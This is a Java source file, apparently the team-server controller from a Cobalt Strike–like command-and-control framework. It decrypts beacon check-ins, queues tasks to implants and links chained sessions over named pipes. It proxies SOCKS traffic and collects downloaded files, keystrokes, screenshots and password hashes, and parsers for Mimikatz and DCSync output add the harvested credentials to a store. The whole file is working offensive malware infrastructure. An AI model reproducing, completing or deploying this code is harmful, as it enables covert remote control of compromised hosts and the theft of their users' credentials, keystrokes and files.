package beacon;

import c2profile.MalleableHook;
import c2profile.Profile;
import common.*;
import dns.AsymmetricCrypto;
import dns.DNSServer;
import dns.QuickSecurity;
import graph.Route;
import parser.*;
import server.ManageUser;
import server.PendingRequest;
import server.Resources;
import server.ServerUtils;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.DataInputStream;
import java.io.IOException;
import java.util.*;

public class BeaconC2 {
    protected BeaconData data;
    protected Profile c2profile;
    protected BeaconHTTP channel_http;
    protected BeaconDNS channel_dns;
    protected QuickSecurity security = null;
    protected AsymmetricCrypto asecurity = null;
    protected CheckinListener checkinl = null;
    protected BeaconCharsets charsets = new BeaconCharsets();
    protected BeaconSocks socks;
    protected BeaconDownloads downloads = new BeaconDownloads();
    protected BeaconParts parts = new BeaconParts();
    protected BeaconPipes pipes = new BeaconPipes();
    protected Resources resources;
    protected Map pending = new HashMap();
    protected int reqno = 0;
    protected LinkedList<Parser> parsers = new LinkedList<>();

    public int register(Request request, ManageUser client) {
        synchronized (this) {
            this.reqno = (this.reqno + 1) % Integer.MAX_VALUE;
            this.pending.put(this.reqno, new PendingRequest(request, client));
            return this.reqno;
        }
    }

    public BeaconDownloads getDownloadManager() {
        return this.downloads;
    }

    public List getDownloads(String bid) {
        return this.downloads.getDownloads(bid);
    }

    public Resources getResources() {
        return this.resources;
    }

    public void setCheckinListener(CheckinListener l) {
        this.checkinl = l;
    }

    public CheckinListener getCheckinListener() {
        return this.checkinl;
    }

    public boolean isCheckinRequired(String id) {
        if (this.data.hasTask(id) || this.socks.isActive(id) || this.downloads.isActive(id) || this.parts.hasPart(id)) {
            return true;
        }
        for (Object o : this.pipes.children(id)) {
            String aid = o + "";
            if (!this.isCheckinRequired(aid)) continue;
            return true;
        }
        return false;
    }

    public long checkinMask(String bid, long idlemask) {
        int mode = this.data.getMode(bid);
        if (mode == 0) {
            String myip = ServerUtils.getMyIP(this.resources);
            return Route.ipToLong(myip);
        }
        if (mode == 1 || mode == 2 || mode == 3) {
            long mask = 240L;
            BeaconEntry entry = this.getCheckinListener().resolve(bid);
            if (entry == null || entry.wantsMetadata()) {
                mask |= 1L;
            }
            if (mode == 2) {
                mask |= 2L;
            }
            if (mode == 3) {
                mask |= 4L;
            }
            return idlemask ^ mask;
        }
        return idlemask;
    }

    public byte[] dump(String bid, int max, int hardmax) {
        return this.dump(bid, max, hardmax, new LinkedHashSet());
    }

    public byte[] dump(String bid, int max, int hardmax, HashSet safety) {
        if (!AssertUtils.TestUnique(bid, safety)) {
            return new byte[0];
        }
        safety.add(bid);
        byte[] tasks = this.data.dump(bid, hardmax);
        int total = tasks.length;
        byte[] proxy = this.socks.dump(bid, max - tasks.length);
        total += proxy.length;
        try {
            ByteArrayOutputStream out = new ByteArrayOutputStream(max);
            if (tasks.length > 0) {
                out.write(tasks, 0, tasks.length);
            }
            if (proxy.length > 0) {
                out.write(proxy, 0, proxy.length);
            }
            for (Object o : this.pipes.children(bid)) {
                CommandBuilder taskc;
                byte[] built;
                String aid = o + "";
                if (total >= max || !this.getSymmetricCrypto().isReady(aid)) continue;
                byte[] more = this.dump(aid, max - total, hardmax - total, safety);
                if (more.length > 0) {
                    more = this.getSymmetricCrypto().encrypt(aid, more);
                    taskc = new CommandBuilder();
                    taskc.setCommand(22);
                    taskc.addInteger(Integer.parseInt(aid));
                    taskc.addString(more);
                    built = taskc.build();
                    out.write(built, 0, built.length);
                    total += built.length;
                    continue;
                }
                if (this.socks.isActive(aid) || !this.downloads.isActive(aid)) {
                    // empty if block
                }
                taskc = new CommandBuilder();
                taskc.setCommand(22);
                taskc.addInteger(Integer.parseInt(aid));
                built = taskc.build();
                out.write(built, 0, built.length);
                total += built.length;
            }
            out.flush();
            out.close();
            byte[] result = out.toByteArray();
            if (tasks.length > 0) {
                this.getCheckinListener().output(BeaconOutput.Checkin(bid, "host called home, sent: " + result.length + " bytes"));
            }
            return result;
        } catch (IOException ioex) {
            MudgeSanity.logException("dump: " + bid, ioex, false);
            return new byte[0];
        }
    }

    public BeaconC2(Profile c2profile, BeaconData data, Resources resources) {
        this.c2profile = c2profile;
        this.resources = resources;
        this.channel_http = new BeaconHTTP(c2profile, this);
        this.channel_dns = new BeaconDNS(c2profile, this);
        this.socks = new BeaconSocks(this);
        this.data = data;
        this.parsers.add(new MimikatzCredentials(resources));
        this.parsers.add(new MimikatzSamDump(resources));
        this.parsers.add(new DcSyncCredentials(resources));
        this.parsers.add(new ScanResults(resources));
        this.parsers.add(new NetViewResults(resources));
    }

    public BeaconSocks getSocks() {
        return this.socks;
    }

    public AsymmetricCrypto getAsymmetricCrypto() {
        return this.asecurity;
    }

    public QuickSecurity getSymmetricCrypto() {
        return this.security;
    }

    public void setCrypto(QuickSecurity s, AsymmetricCrypto a) {
        this.security = s;
        this.asecurity = a;
    }

    public MalleableHook.MyHook getGetHandler() {
        return this.channel_http.getGetHandler();
    }

    public MalleableHook.MyHook getPostHandler() {
        return this.channel_http.getPostHandler();
    }

    public DNSServer.Handler getDNSHandler() {
        return this.channel_dns;
    }

    public BeaconEntry process_beacon_metadata(String ext, byte[] mdata) {
        return this.process_beacon_metadata(ext, mdata, null);
    }

    public BeaconEntry process_beacon_metadata(String ext, byte[] mdata, String bpid) {
        byte[] data = this.getAsymmetricCrypto().decrypt(mdata);
        if (data == null || data.length == 0) {
            CommonUtils.print_error("decrypt of metadata failed");
            return null;
        }
        String dataz = CommonUtils.bString(data);
        String key = dataz.substring(0, 16);
        String charset_ansi = WindowsCharsets.getName(CommonUtils.toShort(dataz.substring(16, 18)));
        String charset_oem = WindowsCharsets.getName(CommonUtils.toShort(dataz.substring(18, 20)));
        BeaconEntry next = new BeaconEntry(data, charset_ansi, ext);
        if (!next.sane()) {
            CommonUtils.print_error("Session " + next + " metadata validation failed. Dropping");
            return null;
        }
        this.getCharsets().register(next.getId(), charset_ansi, charset_oem);
        if (bpid != null) {
            next.link(bpid);
        }
        this.getSymmetricCrypto().registerKey(next.getId(), CommonUtils.toBytes(key));
        if (this.getCheckinListener() != null) {
            this.getCheckinListener().checkin(next);
        } else {
            CommonUtils.print_stat("Checkin listener was NULL (this is good!)");
        }
        return next;
    }

    public BeaconCharsets getCharsets() {
        return this.charsets;
    }

    public BeaconPipes getPipes() {
        return this.pipes;
    }

    public void dead_pipe(String pid, String chid) {
        BeaconEntry pentry = this.getCheckinListener().resolve(pid);
        BeaconEntry centry = this.getCheckinListener().resolve(chid);
        String phost = pentry != null ? pentry.getInternal() : "unknown";
        String chost = centry != null ? centry.getInternal() : "unknown";
        this.getCheckinListener().update(chid, System.currentTimeMillis(), phost + " \u26af \u26af", true);
        boolean isChild = this.pipes.isChild(pid, chid);
        this.pipes.deregister(pid, chid);
        if (isChild) {
            this.getCheckinListener().output(BeaconOutput.Error(pid, "lost link to child " + CommonUtils.session(chid) + ": " + chost));
            this.getCheckinListener().output(BeaconOutput.Error(chid, "lost link to parent " + CommonUtils.session(pid) + ": " + phost));
        }
        Iterator i = this.pipes.children(chid).iterator();
        this.pipes.clear(chid);
        while (i.hasNext()) {
            this.dead_pipe(chid, i.next() + "");
        }
    }

    public void unlink(String id, String target) {
        CommonUtils.print_info("Delink: " + id + " from: " + target);
        LinkedList<String> candidates = new LinkedList<>();
        Map hosts = this.getCheckinListener().buildBeaconModel();
        for (Object o : hosts.entrySet()) {
            Map.Entry entry = (Map.Entry) o;
            String tid = (String) entry.getKey();
            BeaconEntry tentry = (BeaconEntry) entry.getValue();
            if (!target.equals(tentry.getInternal())) continue;
            candidates.add(tid);
        }
        for (Object candidate : candidates) {
            String chid = candidate + "";
            if (this.pipes.isChild(id, chid)) {
                this.task_to_unlink(id, chid);
            }
            if (!this.pipes.isChild(chid, id)) continue;
            this.task_to_unlink(chid, id);
        }
    }

    protected void task_to_unlink(String pid, String chid) {
        CommandBuilder unlink = new CommandBuilder();
        unlink.setCommand(23);
        unlink.addInteger(Integer.parseInt(chid));
        this.data.task(pid, unlink.build());
    }

    protected void task_to_link(String bid, String pipe) {
        CommandBuilder task = new CommandBuilder();
        task.setCommand(68);
        task.addString(pipe);
        this.data.task(bid, task.build());
    }

    public void process_beacon_callback_default(int type, String id, String data) {
        String[] check;
        if (type == -1) {
            String drives = CommonUtils.drives(data);
            this.getCheckinListener().output(BeaconOutput.Output(id, "drives: " + drives));
        } else if (type == -2 && data.split("\n").length >= 3) {
            this.getCheckinListener().output(BeaconOutput.OutputLS(id, data));
        }
    }

    public void runParsers(String text, String bid, int type) {
        for (Parser temp : this.parsers) {
            temp.process(text, bid, type);
        }
    }

    public void process_beacon_callback(String id, byte[] data) {
        byte[] plain = this.getSymmetricCrypto().decrypt(id, data);
        this.process_beacon_callback_decrypted(id, plain);
    }

    public void process_beacon_callback_decrypted(String id, byte[] plain) {
        block68:
        {
            int type = -1;
            if (plain.length == 0) {
                return;
            }
            try {
                DataInputStream in = new DataInputStream(new ByteArrayInputStream(plain));
                type = in.readInt();
                if (type == 0) {
                    String rest = this.getCharsets().process(id, CommonUtils.readAll(in));
                    this.getCheckinListener().output(BeaconOutput.Output(id, "received output:\n" + rest));
                    this.runParsers(rest, id, type);
                    break block68;
                }
                if (type == 30) {
                    String rest = this.getCharsets().processOEM(id, CommonUtils.readAll(in));
                    this.getCheckinListener().output(BeaconOutput.Output(id, "received output:\n" + rest));
                    this.runParsers(rest, id, type);
                    break block68;
                }
                if (type == 32) {
                    String rest = CommonUtils.bString(CommonUtils.readAll(in), "UTF-8");
                    this.getCheckinListener().output(BeaconOutput.Output(id, "received output:\n" + rest));
                    this.runParsers(rest, id, type);
                    break block68;
                }
                if (type == 1) {
                    String rest = this.getCharsets().process(id, CommonUtils.readAll(in));
                    this.getCheckinListener().output(BeaconOutput.Output(id, "received keystrokes"));
                    this.getResources().archive(BeaconOutput.Activity(id, "received keystrokes"));
                    Keystrokes keys = new Keystrokes(id, rest);
                    this.getCheckinListener().keystrokes(keys);
                    break block68;
                }
                if (type == 3) {
                    byte[] rest = CommonUtils.readAll(in);
                    Screenshot ss = new Screenshot(id, rest);
                    this.getCheckinListener().screenshot(ss);
                    this.getCheckinListener().output(BeaconOutput.OutputB(id, "received screenshot (" + rest.length + " bytes)"));
                    this.getResources().archive(BeaconOutput.Activity(id, "received screenshot (" + rest.length + " bytes)"));
                    break block68;
                }
                if (type == 10) {
                    int aid = in.readInt();
                    String rest = CommonUtils.bString(CommonUtils.readAll(in));
                    BeaconEntry entry = this.getCheckinListener().resolve(id + "");
                    BeaconEntry next = this.process_beacon_metadata(entry.getInternal() + " \u26af\u26af", CommonUtils.toBytes(rest), id);
                    if (next != null) {
                        this.pipes.register(id + "", aid + "");
                        if (next.getInternal() == null) {
                            this.getCheckinListener().output(BeaconOutput.Output(id, "established link to child " + CommonUtils.session(aid)));
                            this.getResources().archive(BeaconOutput.Activity(id, "established link to child " + CommonUtils.session(aid)));
                        } else {
                            this.getCheckinListener().output(BeaconOutput.Output(id, "established link to child " + CommonUtils.session(aid) + ": " + next.getInternal()));
                            this.getResources().archive(BeaconOutput.Activity(id, "established link to child " + CommonUtils.session(aid) + ": " + next.getComputer()));
                        }
                        this.getCheckinListener().output(BeaconOutput.Output(next.getId(), "established link to parent " + CommonUtils.session(id) + ": " + entry.getInternal()));
                        this.getResources().archive(BeaconOutput.Activity(next.getId(), "established link to parent " + CommonUtils.session(id) + ": " + entry.getComputer()));
                    }
                    break block68;
                }
                if (type == 11) {
                    int aid = in.readInt();
                    BeaconEntry entry = this.getCheckinListener().resolve(id + "");
                    this.dead_pipe(entry.getId(), aid + "");
                    break block68;
                }
                if (type == 12) {
                    int aid = in.readInt();
                    byte[] rest = CommonUtils.readAll(in);
                    if (rest.length > 0) {
                        this.process_beacon_data(aid + "", rest);
                    }
                    this.getCheckinListener().update(aid + "", System.currentTimeMillis(), null, false);
                    break block68;
                }
                if (type == 13) {
                    String rest = this.getCharsets().process(id, CommonUtils.readAll(in));
                    this.getCheckinListener().output(BeaconOutput.Error(id, rest));
                    break block68;
                }
                if (type == 31) {
                    int errorNo = in.readInt();
                    int arg1 = in.readInt();
                    int arg2 = in.readInt();
                    String arg3 = this.getCharsets().process(id, CommonUtils.readAll(in));
                    this.getCheckinListener().output(BeaconOutput.Error(id, BeaconErrors.toString(errorNo, arg1, arg2, arg3)));
                    break block68;
                }
                if (type == 14) {
                    int aid = in.readInt();
                    if (!this.pipes.isChild(id, aid + "")) {
                        CommandBuilder resend = new CommandBuilder();
                        resend.setCommand(24);
                        resend.addInteger(aid);
                        if (this.data.isNewSession(id)) {
                            this.data.task(id, resend.build());
                            this.data.virgin(id);
                        } else {
                            this.data.task(id, resend.build());
                        }
                        this.pipes.register(id + "", aid + "");
                    }
                    break block68;
                }
                if (type == 18) {
                    int diff = in.readInt();
                    this.getCheckinListener().output(BeaconOutput.Error(id, "Task Rejected! Did your clock change? Wait " + diff + " seconds"));
                    break block68;
                }
                if (type == 28) {
                    int size = in.readInt();
                    byte[] rest = CommonUtils.readAll(in);
                    this.parts.start(id, size);
                    this.parts.put(id, rest);
                    break block68;
                }
                if (type == 29) {
                    byte[] rest = CommonUtils.readAll(in);
                    this.parts.put(id, rest);
                    if (this.parts.isReady(id)) {
                        byte[] next = this.parts.data(id);
                        this.process_beacon_callback_decrypted(id, next);
                    }
                    break block68;
                }
                if (this.data.isNewSession(id)) {
                    this.getCheckinListener().output(BeaconOutput.Error(id, "Dropped responses from session. Didn't expect " + type + " prior to first task."));
                    CommonUtils.print_error("Dropped responses from session " + id + " [type: " + type + "] (no interaction with this session yet)");
                    return;
                }
                if (type == 2) {
                    int fid = in.readInt();
                    long flen = CommonUtils.toUnsignedInt(in.readInt());
                    String name = this.getCharsets().process(id, CommonUtils.readAll(in));
                    BeaconEntry entry = this.getCheckinListener().resolve(id + "");
                    this.getCheckinListener().output(BeaconOutput.OutputB(id, "started download of " + name + " (" + flen + " bytes)"));
                    this.getResources().archive(BeaconOutput.Activity(id, "started download of " + name + " (" + flen + " bytes)"));
                    this.downloads.start(id, fid, entry.getInternal(), name, flen);
                    break block68;
                }
                if (type == 4) {
                    int sid = in.readInt();
                    this.socks.die(id, sid);
                    break block68;
                }
                if (type == 5) {
                    int sid = in.readInt();
                    byte[] rest = CommonUtils.readAll(in);
                    this.socks.write(id, sid, rest);
                    break block68;
                }
                if (type == 6) {
                    int sid = in.readInt();
                    this.socks.resume(id, sid);
                    break block68;
                }
                if (type == 7) {
                    int port = in.readUnsignedShort();
                    this.socks.portfwd(id, port, "127.0.0.1", port);
                    break block68;
                }
                if (type == 8) {
                    int fid = in.readInt();
                    byte[] rest = CommonUtils.readAll(in);
                    if (this.downloads.exists(id + "", fid)) {
                        this.downloads.write(id, fid, rest);
                    } else {
                        CommonUtils.print_error("Received unknown download id " + fid + " - canceling download");
                        CommandBuilder reject = new CommandBuilder();
                        reject.setCommand(19);
                        reject.addInteger(fid);
                        this.data.task(id, reject.build());
                    }
                    break block68;
                }
                if (type == 9) {
                    int fid = in.readInt();
                    String name = this.downloads.getName(id, fid);
                    Download info = this.downloads.getDownload(id, fid);
                    this.downloads.close(id, fid);
                    this.getCheckinListener().output(BeaconOutput.OutputB(id, "download of " + name + " is complete"));
                    this.getResources().archive(BeaconOutput.Activity(id, "download of " + name + " is complete"));
                    this.getCheckinListener().download(info);
                    break block68;
                }
                if (type == 15) {
                    String rest = this.getCharsets().process(id, CommonUtils.readAll(in));
                    this.getCheckinListener().output(BeaconOutput.Output(id, "Impersonated " + rest));
                    break block68;
                }
                if (type == 16) {
                    String rest = this.getCharsets().process(id, CommonUtils.readAll(in));
                    this.getCheckinListener().output(BeaconOutput.OutputB(id, "You are " + rest));
                    break block68;
                }
                if (type == 17) {
                    String rest = this.getCharsets().process(id, CommonUtils.readAll(in));
                    this.getCheckinListener().output(BeaconOutput.OutputPS(id, rest));
                    break block68;
                }
                if (type == 19) {
                    String rest = this.getCharsets().process(id, CommonUtils.readAll(in));
                    this.getCheckinListener().output(BeaconOutput.OutputB(id, "Current directory is " + rest));
                    break block68;
                }
                if (type == 20) {
                    String rest = CommonUtils.bString(CommonUtils.readAll(in));
                    this.getCheckinListener().output(BeaconOutput.OutputJobs(id, rest));
                    break block68;
                }
                if (type == 21) {
                    String rest = CommonUtils.bString(CommonUtils.readAll(in), "UTF-8");
                    this.getCheckinListener().output(BeaconOutput.Output(id, "received password hashes:\n" + rest));
                    this.getResources().archive(BeaconOutput.Activity(id, "received password hashes"));
                    BeaconEntry entry = this.getCheckinListener().resolve(id);
                    if (entry == null) {
                        return;
                    }
                    String[] entries = rest.split("\n");
                    for (String entry1 : entries) {
                        RegexParser parser = new RegexParser(entry1);
                        if (!parser.matches("(.*?):\\d+:.*?:(.*?):::") || parser.group(1).endsWith("$")) continue;
                        ServerUtils.addCredential(this.resources, parser.group(1), parser.group(2), entry.getComputer(), "hashdump", entry.getInternal());
                    }
                    this.resources.call("credentials.push");
                    break block68;
                }
                if (type == 22) {
                    int reqid = in.readInt();
                    String rest = this.getCharsets().process(id, CommonUtils.readAll(in));
                    PendingRequest preq;
                    Integer key = reqid;
                    synchronized (this) {
                        preq = (PendingRequest) this.pending.remove(key);
                    }
                    if (key < 0) {
                        this.process_beacon_callback_default(key, id, rest);
                    } else if (preq != null) {
                        preq.action(rest);
                    } else {
                        CommonUtils.print_error("Callback " + type + "/" + reqid + " has no pending request");
                    }
                    break block68;
                }
                if (type == 23) {
                    int sid = in.readInt();
                    int port = in.readInt();
                    this.socks.accept(id, port, sid);
                } else if (type == 24) {
                    String rest = this.getCharsets().process(id, CommonUtils.readAll(in));
                    this.getResources().archive(BeaconOutput.Activity(id, "received output from net module"));
                    this.getCheckinListener().output(BeaconOutput.Output(id, "received output:\n" + rest));
                    this.runParsers(rest, id, type);
                } else if (type == 25) {
                    String rest = this.getCharsets().process(id, CommonUtils.readAll(in));
                    this.getResources().archive(BeaconOutput.Activity(id, "received output from port scanner"));
                    this.getCheckinListener().output(BeaconOutput.Output(id, "received output:\n" + rest));
                    this.runParsers(rest, id, type);
                } else if (type == 26) {
                    this.getCheckinListener().output(BeaconOutput.Output(id, CommonUtils.session(id) + " exit."));
                    this.getResources().archive(BeaconOutput.Activity(id, CommonUtils.session(id) + " exit."));
                    BeaconEntry entry = this.getCheckinListener().resolve(id);
                    if (entry != null) {
                        entry.die();
                    }
                } else if (type == 27) {
                    String rest = CommonUtils.bString(CommonUtils.readAll(in));
                    if (rest.startsWith("FAIL ")) {
                        rest = CommonUtils.strip(rest, "FAIL ");
                        this.getCheckinListener().output(BeaconOutput.Error(id, "SSH error: " + rest));
                        this.getResources().archive(BeaconOutput.Activity(id, "SSH connection failed."));
                    } else if (rest.startsWith("INFO ")) {
                        rest = CommonUtils.strip(rest, "INFO ");
                        this.getCheckinListener().output(BeaconOutput.OutputB(id, "SSH: " + rest));
                    } else if (rest.startsWith("SUCCESS ")) {
                        rest = CommonUtils.strip(rest, "SUCCESS ");
                        String host = rest.split(" ")[0];
                        String pipe = rest.split(" ")[1];
                        this.task_to_link(id, pipe);
                    } else {
                        CommonUtils.print_error("Unknown SSH status: '" + rest + "'");
                    }
                } else {
                    CommonUtils.print_error("Unknown Beacon Callback: " + type);
                }
            } catch (IOException ioex) {
                MudgeSanity.logException("beacon callback: " + type, ioex, false);
            }
        }
    }

    public boolean process_beacon_data(String id, byte[] data) {
        try {
            DataInputStream in = new DataInputStream(new ByteArrayInputStream(data));
            while (in.available() > 0) {
                int len = in.readInt();
                if (len > in.available()) {
                    CommonUtils.print_error("Beacon " + id + " response length " + len + " exceeds " + in.available() + " available bytes. [Received " + data.length + " bytes]");
                    return false;
                }
                if (len <= 0) {
                    CommonUtils.print_error("Beacon " + id + " response length " + len + " is invalid. [Received " + data.length + " bytes]");
                    return false;
                }
                byte[] next = new byte[len];
                in.read(next, 0, len);
                this.process_beacon_callback(id, next);
            }
            in.close();
            return true;
        } catch (Exception ex) {
            MudgeSanity.logException("process_beacon_data: " + id, ex, false);
            return false;
        }
    }
}

